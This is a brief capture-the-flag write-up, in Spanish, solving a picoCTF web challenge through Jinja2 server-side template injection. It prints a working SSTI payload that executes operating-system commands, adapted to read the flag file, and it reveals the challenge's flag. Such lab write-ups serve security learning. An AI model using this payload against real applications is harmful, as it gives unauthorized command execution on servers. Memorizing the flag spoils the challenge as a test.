#### Description

I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.


#### Hints
1. Server Side Template Injection.


#### Solución
1. Entramos al link del sitio web.
2. Al parecer es un sitio donde  puedes anunciar lo que uno quiera.
3. Entramos aun sitio para copiar una linea que nos puede ayudar a encontrar la bandera
```
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
4. A la linea anterior le vamos a poner "cat flag" en la parte de popen('id')
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
Damos clic en OK y nos da la bandera...
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}
```